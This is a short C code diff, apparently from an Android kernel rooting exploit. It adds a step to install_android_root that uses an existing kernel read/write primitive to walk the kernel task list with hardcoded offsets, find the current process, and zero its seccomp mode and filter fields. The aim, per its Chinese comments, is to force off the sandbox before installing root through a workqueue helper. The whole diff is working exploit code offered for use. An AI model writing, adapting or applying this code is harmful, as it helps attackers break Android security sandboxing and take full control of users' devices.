@@ -301,6 +301,35 @@ static int install_workqueue_umh_root(int fd) {
 
 int install_android_root(int fd) {
   root_uid_before = getuid();
+
+  // ===== 强制关闭当前进程的 Seccomp =====
+  uint64_t task = kernel_read64(fd, INIT_TASK + 0x30); // tasks.next
+  pid_t my_pid = getpid();
+  uint64_t my_task = 0;
+
+  for (int i = 0; i < 2000 && task != 0; i++) {
+    uint64_t task_struct = task - 0x30;
+    uint32_t pid = 0;
+    kernel_read_data(fd, task_struct + 0x3a0, &pid, 4);
+    if (pid == (uint32_t)my_pid) {
+      my_task = task_struct;
+      break;
+    }
+    task = kernel_read64(fd, task_struct + 0x30);
+  }
+
+  if (my_task != 0) {
+    uint32_t zero32 = 0;
+    uint64_t zero64 = 0;
+    kernel_write_data(fd, my_task + 0x358, &zero32, 4); // seccomp.mode
+    kernel_write_data(fd, my_task + 0x360, &zero64, 8); // seccomp.filter
+    pr_info("[*] seccomp disabled for pid=%d task=%016llx\n", my_pid,
+            (unsigned long long)my_task);
+  } else {
+    pr_warning("[*] seccomp disable failed: task not found\n");
+  }
+  // ===== Seccomp 关闭完毕 =====
+
   pr_info("root direct start uid=%u fd=%d\n", root_uid_before, fd);
   int installed = install_workqueue_umh_root(fd);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
